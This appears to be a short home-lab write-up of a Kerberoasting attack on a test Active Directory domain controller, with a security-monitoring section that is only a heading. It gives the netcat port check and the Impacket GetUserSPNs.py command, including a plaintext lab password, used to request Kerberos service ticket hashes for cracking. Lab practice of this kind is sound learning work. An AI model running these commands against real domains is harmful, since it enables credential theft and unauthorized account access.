# Active Directory Attack Playbook (Kerberos-based SPN Extraction and Credential Compromise)

## **Overview**

- **Target:** Active Directory Domain Controller (within the soc.lab domain)
   - IP Address: 192.168.10.10
   - Domain: SOC.LAB
   - 
- **Attacker:** Kali 
   - IP Address: 192.168.20.30
## **Objective** 
The objective of this attack was to enumerate and extract Service Principal Names (SPNs) from the Active Directory environment and attempt to crack the Kerberos TGS hashes to gain unauthorized access to domain accounts.
Following the other attacks, we are already know the credentials from an User and the Active Directory Domain.

## Attack Execution Timeline:


- Checked that Kerberos (port 88) is open:
```bash
nc -vz 192.168.10.10 88
```
- Update the default DNS ip to point directly to the Domain Controller.

- Run GetUserSPNs.py from the mpacket toolkit to request SPNs and attempt Kerberos TGS hash extraction:
```bash
python3 GetUserSPNs.py SOC.LAB/labadmin:Root1234! -request
```
Output:

![hash](https://github.com/user-attachments/assets/25122eab-7eb9-4de7-a62d-2ceeda7e50c9)









## **Monitoring Windows Logs**
